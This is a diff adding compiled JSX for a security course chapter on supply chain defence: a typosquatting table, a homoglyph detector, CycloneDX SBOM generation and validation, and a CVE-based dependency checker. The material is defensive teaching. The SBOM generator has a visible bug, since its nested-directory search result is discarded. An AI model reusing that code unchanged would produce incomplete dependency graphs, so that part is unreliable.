+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "bable-core"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Credential theft"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "node-fetch"
+            })
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.code, {
+              children: "node-fetch"
+            }), " (hidden zero-width chars)"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Arbitrary code execution"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "cross-env"
+            })
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.code, {
+              children: "cross-env"
+            }), " (Unicode homoglyph)"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Environment variable theft"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "request"
+            })
+          }), (0,jsx_runtime.jsxs)(_components.td, {
+            children: [(0,jsx_runtime.jsx)(_components.code, {
+              children: "request"
+            }), " (deprecated — malware found in abandoned packages)"]
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Credential harvesting"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Malicious package detection approach:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Typosquatting detector that uses Levenshtein distance and\n * homoglyph detection to flag potentially malicious packages.\n */\ninterface PackageReport {\n  requestedName: string;\n  closestLegitimateMatch: string | null;\n  editDistance: number;\n  containsHomoglyphs: boolean;\n  verdict: 'SAFE' | 'SUSPICIOUS' | 'MALICIOUS';\n  reason: string;\n}\n\nclass TyposquattingDetector {\n  private readonly legitimatePackages: Set<string>;\n  private readonly homoglyphMap: Map<string, string>;\n\n  constructor(legitimatePackages: string[]) {\n    this.legitimatePackages = new Set(legitimatePackages);\n    this.homoglyphMap = new Map([\n      ['0', 'o'], ['O', 'o'],\n      ['1', 'l'], ['I', 'l'], ['l', 'i'],\n      ['5', 's'], ['S', 's'],\n      ['8', 'b'], ['B', 'b'],\n      ['ё', 'е'], ['é', 'e'], ['è', 'e'],\n      ['а', 'a'], // Cyrillic 'а'\n      ['с', 'c'], // Cyrillic 'с'\n      ['е', 'e'], // Cyrillic 'e'\n      ['о', 'o'], // Cyrillic 'o'\n      ['р', 'p'], // Cyrillic 'p'\n      ['х', 'x'], // Cyrillic 'х'\n      ['і', 'i'], // Cyrillic 'i'\n    ]);\n  }\n\n  /**\n   * Compute Levenshtein distance between two strings.\n   */\n  private levenshteinDistance(a: string, b: string): number {\n    const dp: number[][] = Array.from({ length: a.length + 1 }, () =>\n      Array(b.length + 1).fill(0)\n    );\n    for (let i = 0; i <= a.length; i++) dp[i][0] = i;\n    for (let j = 0; j <= b.length; j++) dp[0][j] = j;\n    for (let i = 1; i <= a.length; i++) {\n      for (let j = 1; j <= b.length; j++) {\n        const cost = a[i - 1] === b[j - 1] ? 0 : 1;\n        dp[i][j] = Math.min(\n          dp[i - 1][j] + 1,\n          dp[i][j - 1] + 1,\n          dp[i - 1][j - 1] + cost\n        );\n      }\n    }\n    return dp[a.length][b.length];\n  }\n\n  /**\n   * Normalize homoglyph characters to their latin equivalents.\n   */\n  private normalizeHomoglyphs(input: string): string {\n    return input\n      .split('')\n      .map((ch) => this.homoglyphMap.get(ch) ?? ch)\n      .join('');\n  }\n\n  /**\n   * Check if a string contains Unicode homoglyph characters.\n   */\n  private hasHomoglyphs(input: string): boolean {\n    for (const ch of input) {\n      if (this.homoglyphMap.has(ch)) return true;\n    }\n    return false;\n  }\n\n  /**\n   * Find the closest legitimate package name.\n   */\n  private findClosestMatch(input: string): {\n    name: string;\n    distance: number;\n  } | null {\n    const normalizedInput = this.normalizeHomoglyphs(input).toLowerCase();\n    let best: { name: string; distance: number } | null = null;\n\n    for (const legit of this.legitimatePackages) {\n      const normalizedLegit = legit.toLowerCase();\n      if (normalizedLegit === normalizedInput) {\n        return { name: legit, distance: 0 };\n      }\n      const dist = this.levenshteinDistance(normalizedInput, normalizedLegit);\n      if (dist <= 3 && (best === null || dist < best.distance)) {\n        best = { name: legit, distance: dist };\n      }\n    }\n    return best;\n  }\n\n  /**\n   * Scan a package name for potential typosquatting.\n   */\n  scan(packageName: string): PackageReport {\n    const hasHomoglyphs = this.hasHomoglyphs(packageName);\n    const closest = this.findClosestMatch(packageName);\n\n    if (closest === null) {\n      return {\n        requestedName: packageName,\n        closestLegitimateMatch: null,\n        editDistance: Infinity,\n        containsHomoglyphs: hasHomoglyphs,\n        verdict: 'SAFE',\n        reason: 'No similar legitimate package found.',\n      };\n    }\n\n    if (closest.distance === 0) {\n      return {\n        requestedName: packageName,\n        closestLegitimateMatch: closest.name,\n        editDistance: 0,\n        containsHomoglyphs: hasHomoglyphs,\n        verdict: 'SAFE',\n        reason: 'Package name matches a legitimate package exactly.',\n      };\n    }\n\n    const isHighRisk = hasHomoglyphs || closest.distance <= 1;\n    return {\n      requestedName: packageName,\n      closestLegitimateMatch: closest.name,\n      editDistance: closest.distance,\n      containsHomoglyphs: hasHomoglyphs,\n      verdict: isHighRisk ? 'MALICIOUS' : 'SUSPICIOUS',\n      reason: isHighRisk\n        ? `Package \"${packageName}\" closely resembles \"${closest.name}\" `\n          + `(distance: ${closest.distance})${hasHomoglyphs ? ' with homoglyph characters' : ''}. `\n          + `Likely typosquatting.`\n        : `Package \"${packageName}\" is similar to \"${closest.name}\" `\n          + `(distance: ${closest.distance}). Verify manually.`,\n    };\n  }\n}\n\n// Demonstration\nconst detector = new TyposquattingDetector([\n  'lodash', 'babel-core', 'node-fetch', 'express', 'request',\n  'mongoose', 'axios', 'chalk', 'commander', 'async',\n]);\n\nconst scans = ['l0dash', 'bable-core', 'express', 'async', 'ax10s', 'mοngoose'];\nfor (const pkg of scans) {\n  console.log(detector.scan(pkg));\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "163-software-bill-of-materials-sbom",
+      children: "16.3 Software Bill of Materials (SBOM)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "A Software Bill of Materials (SBOM) is a formal, machine-readable inventory of all components in a software artifact. It lists every dependency, including transitive dependencies, version information, and license data."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1631-sbom-formats",
+      children: "16.3.1 SBOM Formats"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Format"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Standard Body"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Format Type"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Key Features"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "SPDX"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Linux Foundation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "RDF/XML, Tag:Value, JSON, YAML"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Legal/license focus, ISO 5962:2021"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "CycloneDX"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OWASP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "JSON, XML"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Security-focused, vulnerability mapping, service components"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.strong, {
+              children: "SWID"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ISO/IEC 19770-2:2015"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "XML"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Tag-based, ISO standard, software identity focus"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1632-cyclonedx-sbom-generator-typescript",
+      children: "16.3.2 CycloneDX SBOM Generator (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * CycloneDX SBOM Generator\n *\n * Parses a project's package.json and node_modules directory\n * to produce a valid CycloneDX 1.5 JSON SBOM document.\n */\n\nimport * as fs from 'fs';\nimport * as path from 'path';\nimport { createHash } from 'crypto';\n\n/* ─── Type Definitions ─── */\n\ninterface PackageJson {\n  name: string;\n  version: string;\n  description?: string;\n  license?: string;\n  dependencies?: Record<string, string>;\n  devDependencies?: Record<string, string>;\n}\n\ninterface CycloneDXSBOM {\n  bomFormat: 'CycloneDX';\n  specVersion: '1.5';\n  serialNumber: string;\n  version: number;\n  metadata: {\n    timestamp: string;\n    tools: Array<{ vendor: string; name: string; version: string }>;\n    component: CycloneDXComponent;\n    properties?: Array<{ name: string; value: string }>;\n  };\n  components: CycloneDXComponent[];\n  dependencies: CycloneDXDependency[];\n}\n\ninterface CycloneDXComponent {\n  type: 'application' | 'library' | 'framework' | 'container' | 'file';\n  'bom-ref': string;\n  name: string;\n  version: string;\n  description?: string;\n  licenses?: Array<{ license: { id: string } }>;\n  hashes?: Array<{\n    alg: 'SHA-1' | 'SHA-256' | 'SHA-512' | 'MD5';\n    content: string;\n  }>;\n  purl?: string;\n  externalReferences?: Array<{\n    type: 'vcs' | 'website' | 'issue-tracker' | 'advisories';\n    url: string;\n  }>;\n}\n\ninterface CycloneDXDependency {\n  ref: string;\n  dependsOn: string[];\n}\n\n/* ─── SBOM Generator ─── */\n\nclass CycloneDXSBOMGenerator {\n  private readonly projectRoot: string;\n\n  constructor(projectRoot: string) {\n    this.projectRoot = projectRoot;\n  }\n\n  /**\n   * Compute SHA-256 hash of a file.\n   */\n  private computeFileHash(filePath: string): string | null {\n    try {\n      const content = fs.readFileSync(filePath);\n      return createHash('sha256').update(content).digest('hex');\n    } catch {\n      return null;\n    }\n  }\n\n  /**\n   * Parse a component's package.json to extract metadata.\n   */\n  private parseComponentPackageJson(componentPath: string): PackageJson | null {\n    const pkgJsonPath = path.join(componentPath, 'package.json');\n    if (!fs.existsSync(pkgJsonPath)) return null;\n    try {\n      return JSON.parse(fs.readFileSync(pkgJsonPath, 'utf-8')) as PackageJson;\n    } catch {\n      return null;\n    }\n  }\n\n  /**\n   * Recursively scan node_modules to discover all installed packages.\n   */\n  private scanNodeModules(\n    nodeModulesPath: string,\n    depth: number = 0\n  ): Map<string, CycloneDXComponent> {\n    const components = new Map<string, CycloneDXComponent>();\n\n    if (depth > 5 || !fs.existsSync(nodeModulesPath)) return components;\n\n    const entries = fs.readdirSync(nodeModulesPath, { withFileTypes: true });\n\n    for (const entry of entries) {\n      if (entry.name.startsWith('.')) continue;\n\n      if (entry.name.startsWith('@')) {\n        // Handle scoped packages (@scope/name)\n        const scopePath = path.join(nodeModulesPath, entry.name);\n        if (entry.isDirectory()) {\n          const subEntries = fs.readdirSync(scopePath, { withFileTypes: true });\n          for (const subEntry of subEntries) {\n            if (subEntry.isDirectory()) {\n              const pkgFullName = `${entry.name}/${subEntry.name}`;\n              const pkgDir = path.join(scopePath, subEntry.name);\n              const component = this.buildComponent(pkgFullName, pkgDir);\n              if (component) {\n                components.set(component['bom-ref'], component);\n              }\n              // Recurse for nested node_modules\n              const nested = this.scanNodeModules(\n                path.join(pkgDir, 'node_modules'),\n                depth + 1\n              );\n              nested.forEach((v, k) => components.set(k, v));\n            }\n          }\n        }\n      } else if (entry.isDirectory()) {\n        const pkgDir = path.join(nodeModulesPath, entry.name);\n        const component = this.buildComponent(entry.name, pkgDir);\n        if (component) {\n          components.set(component['bom-ref'], component);\n        }\n        // Recurse for nested node_modules\n        const nested = this.scanNodeModules(\n          path.join(pkgDir, 'node_modules'),\n          depth + 1\n        );\n        nested.forEach((v, k) => components.set(k, v));\n      }\n    }\n\n    return components;\n  }\n\n  /**\n   * Build a CycloneDX component from a package directory.\n   */\n  private buildComponent(\n    packageName: string,\n    packageDir: string\n  ): CycloneDXComponent | null {\n    const pkgJson = this.parseComponentPackageJson(packageDir);\n    if (!pkgJson) return null;\n\n    const bomRef = `pkg:npm/${packageName}@${pkgJson.version}`;\n    const mainEntry = pkgJson.main || 'index.js';\n    const mainPath = path.join(packageDir, mainEntry);\n    const hash = this.computeFileHash(mainPath);\n\n    const component: CycloneDXComponent = {\n      type: 'library',\n      'bom-ref': bomRef,\n      name: packageName,\n      version: pkgJson.version,\n      description: pkgJson.description,\n      purl: `pkg:npm/${packageName}@${pkgJson.version}`,\n    };\n\n    if (pkgJson.license) {\n      component.licenses = [{ license: { id: pkgJson.license } }];\n    }\n\n    if (hash) {\n      component.hashes = [{ alg: 'SHA-256', content: hash }];\n    }\n\n    return component;\n  }\n\n  /**\n   * Build the dependency graph for the SBOM.\n   */\n  private buildDependencyGraph(\n    rootComponent: CycloneDXComponent,\n    allComponents: Map<string, CycloneDXComponent>\n  ): CycloneDXDependency[] {\n    const dependencies: CycloneDXDependency[] = [];\n    const visited = new Set<string>();\n\n    const resolveDependencies = (\n      componentRef: string,\n      currentDepth: number\n    ): string[] => {\n      if (currentDepth > 10 || visited.has(componentRef)) return [];\n      visited.add(componentRef);\n\n      const component = allComponents.get(componentRef);\n      if (!component) return [];\n\n      const componentDir = this.findComponentDir(component.name, component.version);\n      if (!componentDir) return [];\n\n      const pkgJson = this.parseComponentPackageJson(componentDir);\n      if (!pkgJson) return [];\n\n      const deps = {\n        ...(pkgJson.dependencies ?? {}),\n        ...(pkgJson.devDependencies ?? {}),\n      };\n\n      const depRefs: string[] = [];\n      for (const [depName] of Object.entries(deps)) {\n        // Find the matching component\n        for (const [ref, comp] of allComponents) {\n          if (comp.name === depName) {\n            depRefs.push(ref);\n            break;\n          }\n        }\n      }\n\n      dependencies.push({\n        ref: componentRef,\n        dependsOn: depRefs,\n      });\n\n      for (const depRef of depRefs) {\n        resolveDependencies(depRef, currentDepth + 1);\n      }\n\n      return depRefs;\n    };\n\n    resolveDependencies(rootComponent['bom-ref'], 0);\n    return dependencies;\n  }\n\n  private findComponentDir(\n    name: string,\n    version: string\n  ): string | null {\n    // Check direct node_modules\n    const direct = path.join(this.projectRoot, 'node_modules', name);\n    if (fs.existsSync(direct)) return direct;\n\n    // Check nested node_modules\n    const searchDir = path.join(this.projectRoot, 'node_modules');\n    this.findNestedDir(searchDir, name);\n    return null;\n  }\n\n  private findNestedDir(basePath: string, targetName: string): string | null {\n    if (!fs.existsSync(basePath)) return null;\n    const entries = fs.readdirSync(basePath, { withFileTypes: true });\n    for (const entry of entries) {\n      if (entry.isDirectory()) {\n        const fullPath = path.join(basePath, entry.name);\n        if (entry.name === targetName) return fullPath;\n        if (entry.name !== 'node_modules') continue;\n        const result = this.findNestedDir(fullPath, targetName);\n        if (result) return result;\n      }\n    }\n    return null;\n  }\n\n  /**\n   * Generate the complete CycloneDX SBOM.\n   */\n  generate(): CycloneDXSBOM {\n    const rootPkgPath = path.join(this.projectRoot, 'package.json');\n    const rootPkg = JSON.parse(\n      fs.readFileSync(rootPkgPath, 'utf-8')\n    ) as PackageJson;\n\n    const rootComponent: CycloneDXComponent = {\n      type: 'application',\n      'bom-ref': `pkg:npm/${rootPkg.name}@${rootPkg.version}`,\n      name: rootPkg.name,\n      version: rootPkg.version,\n      description: rootPkg.description,\n      purl: `pkg:npm/${rootPkg.name}@${rootPkg.version}`,\n    };\n\n    if (rootPkg.license) {\n      rootComponent.licenses = [{ license: { id: rootPkg.license } }];\n    }\n\n    const nodeModulesPath = path.join(this.projectRoot, 'node_modules');\n    const components = this.scanNodeModules(nodeModulesPath);\n\n    const allComponents = new Map(components);\n    allComponents.set(rootComponent['bom-ref'], rootComponent);\n\n    const dependencies = this.buildDependencyGraph(rootComponent, allComponents);\n\n    const sbom: CycloneDXSBOM = {\n      bomFormat: 'CycloneDX',\n      specVersion: '1.5',\n      serialNumber: `urn:uuid:${this.generateUUID()}`,\n      version: 1,\n      metadata: {\n        timestamp: new Date().toISOString(),\n        tools: [\n          {\n            vendor: 'Cybersecurity Course',\n            name: 'CycloneDX SBOM Generator',\n            version: '1.0.0',\n          },\n        ],\n        component: rootComponent,\n      },\n      components: Array.from(allComponents.values()),\n      dependencies,\n    };\n\n    return sbom;\n  }\n\n  private generateUUID(): string {\n    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {\n      const r = (Math.random() * 16) | 0;\n      const v = c === 'x' ? r : (r & 0x3) | 0x8;\n      return v.toString(16);\n    });\n  }\n}\n\n// ─── Usage ───\n// const generator = new CycloneDXSBOMGenerator('/path/to/project');\n// const sbom = generator.generate();\n// fs.writeFileSync('bom.cyclonedx.json', JSON.stringify(sbom, null, 2));\n// console.log(`SBOM generated with ${sbom.components.length} components`);\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1633-sbom-validation",
+      children: "16.3.3 SBOM Validation"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Validates a CycloneDX SBOM document for structural correctness\n * and semantic consistency.\n */\n\ninterface ValidationResult {\n  valid: boolean;\n  errors: string[];\n  warnings: string[];\n}\n\nclass CycloneDXValidator {\n  validate(sbom: unknown): ValidationResult {\n    const errors: string[] = [];\n    const warnings: string[] = [];\n\n    if (typeof sbom !== 'object' || sbom === null) {\n      return { valid: false, errors: ['SBOM must be a non-null object'], warnings: [] };\n    }\n\n    const doc = sbom as Record<string, unknown>;\n\n    // Required fields check\n    if (doc.bomFormat !== 'CycloneDX') {\n      errors.push('bomFormat must be \"CycloneDX\"');\n    }\n\n    if (!doc.specVersion || typeof doc.specVersion !== 'string') {\n      errors.push('specVersion is required and must be a string');\n    }\n\n    if (!doc.serialNumber || typeof doc.serialNumber !== 'string') {\n      errors.push('serialNumber is required');\n    }\n\n    if (typeof doc.version !== 'number' || doc.version < 1) {\n      errors.push('version must be a positive integer');\n    }\n\n    // Metadata validation\n    if (!doc.metadata || typeof doc.metadata !== 'object') {\n      errors.push('metadata is required');\n    } else {\n      const metadata = doc.metadata as Record<string, unknown>;\n      if (!metadata.component) {\n        errors.push('metadata.component is required');\n      }\n    }\n\n    // Components validation\n    if (!Array.isArray(doc.components)) {\n      errors.push('components must be an array');\n    } else {\n      const comps = doc.components as Array<Record<string, unknown>>;\n      const bomRefs = new Set<string>();\n\n      for (const [idx, comp] of comps.entries()) {\n        if (!comp.type) errors.push(`components[${idx}]: type is required`);\n        if (!comp['bom-ref']) errors.push(`components[${idx}]: bom-ref is required`);\n        else if (bomRefs.has(comp['bom-ref'] as string)) {\n          errors.push(`components[${idx}]: duplicate bom-ref \"${comp['bom-ref']}\"`);\n        } else {\n          bomRefs.add(comp['bom-ref'] as string);\n        }\n        if (!comp.name) errors.push(`components[${idx}]: name is required`);\n        if (!comp.version) errors.push(`components[${idx}]: version is required`);\n      }\n\n      if (comps.length === 0) {\n        warnings.push('SBOM contains no components');\n      }\n    }\n\n    // Dependencies validation\n    if (doc.dependencies !== undefined) {\n      if (!Array.isArray(doc.dependencies)) {\n        errors.push('dependencies must be an array');\n      }\n    }\n\n    return {\n      valid: errors.length === 0,\n      errors,\n      warnings,\n    };\n  }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "164-dependency-security-analysis",
+      children: "16.4 Dependency Security Analysis"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1641-dependency-vulnerability-checker-typescript",
+      children: "16.4.1 Dependency Vulnerability Checker (TypeScript)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Dependency Vulnerability Checker\n *\n * Compares a project's dependencies against a local CVE database\n * to identify known vulnerabilities. In production, this would\n * connect to the NVD API or use a local OWASP Dependency Check DB.\n */\n\n/* ─── Type Definitions ─── */\n\ninterface VulnerabilityRecord {\n  id: string;\n  packageName: string;\n  affectedVersions: string;\n  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';\n  description: string;\n  cvssScore: number;\n  fixVersion: string | null;\n}\n\ninterface DependencyEntry {\n  name: string;\n  version: string;\n  type: 'direct' | 'transitive';\n  path: string;\n}\n\ninterface VulnerabilityResult {\n  dependency: DependencyEntry;\n  vulnerability: VulnerabilityRecord;\n  isAffected: boolean;\n  suggestedFix: string;\n}\n\ninterface ScanReport {\n  scannedAt: string;\n  totalDependencies: number;\n  totalVulnerabilities: number;\n  results: VulnerabilityResult[];\n  summary: {\n    critical: number;\n    high: number;\n    medium: number;\n    low: number;\n  };\n}\n\n/* ─── Version Comparator ─── */\n\nclass VersionComparator {\n  /**\n   * Parse a semver string into its components.\n   */\n  private parse(version: string): { major: number; minor: number; patch: number; prerelease?: string } {\n    const cleaned = version.replace(/^[v^~]/, '');\n    const parts = cleaned.split(/[-+]/);\n    const nums = parts[0].split('.').map(Number);\n\n    return {\n      major: nums[0] ?? 0,\n      minor: nums[1] ?? 0,\n      patch: nums[2] ?? 0,\n      prerelease: parts[1],\n    };\n  }\n\n  /**\n   * Check if a version is within an affected range.\n   * Supports simple range expressions like:\n   * - \">=2.0.0 <2.15.0\"\n   * - \"<1.0.0\"\n   * - \"=2.14.1\"\n   * - \"*\" (all versions)\n   */\n  isAffected(version: string, affectedRange: string): boolean {\n    const ver = this.parse(version);\n\n    if (affectedRange === '*') return true;\n\n    const parts = affectedRange.split(' ').filter(Boolean);\n    for (let i = 0; i < parts.length; i += 2) {\n      const op = parts[i];\n      const targetVersion = parts[i + 1];\n      if (!op || !targetVersion) continue;\n\n      const target = this.parse(targetVersion);\n      const matchesOp = this.compareVersions(ver, op, target);\n      if (i === 0 && !matchesOp) return false;\n      if (i > 0 && !matchesOp) return false;\n    }\n\n    return true;\n  }\n\n  private compareVersions(\n    v: ReturnType<VersionComparator['parse']>,\n    operator: string,\n    target: ReturnType<VersionComparator['parse']>\n  ): boolean {\n    const majorDiff = v.major - target.major;\n    const minorDiff = v.minor - target.minor;\n    const patchDiff = v.patch - target.patch;\n\n    const fullDiff = majorDiff !== 0 ? majorDiff : minorDiff !== 0 ? minorDiff : patchDiff;\n\n    switch (operator) {\n      case '>=': return fullDiff >= 0;\n      case '<=': return fullDiff <= 0;\n      case '>': return fullDiff > 0;\n      case '<': return fullDiff < 0;\n      case '=':\n      case '==': return fullDiff === 0;\n      default: return false;\n    }\n  }\n}\n\n/* ─── Vulnerability Checker ─── */\n\nclass DependencyVulnerabilityChecker {\n  private readonly cveDatabase: VulnerabilityRecord[];\n  private readonly versionComparator: VersionComparator;\n\n  constructor(cveDatabase: VulnerabilityRecord[]) {\n    this.cveDatabase = cveDatabase;\n    this.versionComparator = new VersionComparator();\n  }\n\n  /**\n   * Scan a list of dependencies against the CVE database.\n   */\n  scan(dependencies: DependencyEntry[]): ScanReport {\n    const results: VulnerabilityResult[] = [];\n    const summary = { critical: 0, high: 0, medium: 0, low: 0 };\n\n    for (const dep of dependencies) {\n      for (const vuln of this.cveDatabase) {\n        if (vuln.packageName !== dep.name) continue;\n\n        const isAffected = this.versionComparator.isAffected(\n          dep.version,\n          vuln.affectedVersions\n        );\n\n        if (isAffected) {\n          summary[vuln.severity.toLowerCase() as keyof typeof summary]++;\n          results.push({\n            dependency: dep,\n            vulnerability: vuln,\n            isAffected: true,\n            suggestedFix: vuln.fixVersion\n              ? `Upgrade ${dep.name} from ${dep.version} to ${vuln.fixVersion}`\n              : `No fix available. Consider replacing ${dep.name} with an alternative.`,\n          });\n        }\n      }\n    }\n\n    return {\n      scannedAt: new Date().toISOString(),\n      totalDependencies: dependencies.length,\n      totalVulnerabilities: results.length,\n      results,\n      summary,\n    };\n  }\n}\n\n// ─── Demonstration ───\n\nconst sampleCVE: VulnerabilityRecord[] = [\n  {\n    id: 'CVE-2021-44228',\n    packageName: 'log4j-core',\n    affectedVersions: '>=2.0.0 <2.15.0',\n    severity: 'CRITICAL',\n    description: 'Log4Shell RCE via JNDI lookup injection',\n    cvssScore: 10.0,\n    fixVersion: '2.15.0',\n  },\n  {\n    id: 'CVE-2022-22965',\n    packageName: 'spring-core',\n    affectedVersions: '>=5.3.0 <5.3.18',\n    severity: 'CRITICAL',\n    description: 'Spring4Shell RCE via data binding',\n    cvssScore: 9.8,\n    fixVersion: '5.3.18',\n  },\n  {\n    id: 'CVE-2023-25194',\n    packageName: 'kafka-clients',\n    affectedVersions: '>=3.0.0 <3.3.3',\n    severity: 'HIGH',\n    description: 'Kafka Connect RCE via JNDI injection',\n    cvssScore: 8.1,\n    fixVersion: '3.3.3',\n  },\n  {\n    id: 'CVE-2024-3094',\n    packageName: 'xz-utils',\n    affectedVersions: '>=5.6.0 <5.6.1',\n    severity: 'CRITICAL',\n    description: 'xz backdoor — malicious code in upstream tarballs',\n    cvssScore: 10.0,\n    fixVersion: '5.6.1',\n  },\n];\n\nconst sampleDeps: DependencyEntry[] = [\n  { name: 'log4j-core', version: '2.14.1', type: 'transitive', path: 'app > logging-lib > log4j-core' },\n  { name: 'spring-core', version: '5.3.16', type: 'direct', path: 'node_modules/spring-core' },\n  { name: 'kafka-clients', version: '3.3.4', type: 'direct', path: 'node_modules/kafka-clients' },\n  { name: 'express', version: '4.18.2', type: 'direct', path: 'node_modules/express' },\n];\n\nconst checker = new DependencyVulnerabilityChecker(sampleCVE);\nconst report = checker.scan(sampleDeps);\n\nconsole.log(JSON.stringify(report, null, 2));\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1642-transitive-dependency-risks",
+      children: "16.4.2 Transitive Dependency Risks"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Transitive dependencies (dependencies of dependencies) represent a significant blind spot:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "/**\n * Analyzes transitive dependency depth and flags high-risk chains.\n */\ninterface DependencyNode {\n  name: string;\n  version: string;\n  dependencies: DependencyNode[];\n  depth: number;\n}\n\nclass TransitiveDependencyAnalyzer {\n  /**\n   * Build a dependency tree from package.json and node_modules.\n   */\n  analyze(graph: DependencyNode, maxDepth: number = 10): string[] {\n    const warnings: string[] = [];\n    this.traverse(graph, new Set(), 0, maxDepth, warnings);\n    return warnings;\n  }\n\n  private traverse(\n    node: DependencyNode,\n    visited: Set<string>,\n    currentDepth: number,\n    maxDepth: number,\n    warnings: string[]\n  ): void {\n    const key = `${node.name}@${node.version}`;\n    if (visited.has(key)) {\n      warnings.push(\n        `CYCLE DETECTED: \"${node.name}@${node.version}\" appears multiple times in dependency tree`\n      );\n      return;\n    }\n\n    if (currentDepth >= maxDepth) {\n      warnings.push(\n        `EXCESSIVE DEPTH: \"${node.name}@${node.version}\" at depth ${currentDepth} exceeds max ${maxDepth}`\n      );\n      return;\n    }\n\n    visited.add(key);\n\n    for (const dep of node.dependencies) {\n      this.traverse(dep, new Set(visited), currentDepth + 1, maxDepth, warnings);\n    }\n  }\n\n  /**\n   * Detect version conflicts (same package at different versions).\n   */\n  detectVersionConflicts(root: DependencyNode): Map<string, Set<string>> {\n    const versionMap = new Map<string, Set<string>>();\n    this.collectVersions(root, versionMap);\n\n    const conflicts = new Map<string, Set<string>>();\n    for (const [pkgName, versions] of versionMap) {\n      if (versions.size > 1) {\n        conflicts.set(pkgName, versions);\n      }\n    }\n    return conflicts;\n  }\n\n  private collectVersions(\n    node: DependencyNode,\n    versionMap: Map<string, Set<string>>\n  ): void {\n    if (!versionMap.has(node.name)) {\n      versionMap.set(node.name, new Set());\n    }\n    versionMap.get(node.name)!.add(node.version);\n\n    for (const dep of node.dependencies) {\n      this.collectVersions(dep, versionMap);\n    }\n  }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "165-cicd-pipeline-hardening",
+      children: "16.5 CI/CD Pipeline Hardening"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Modern CI/CD pipelines are a prime target for attackers because they have access to source code, secrets, and production deployment credentials."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
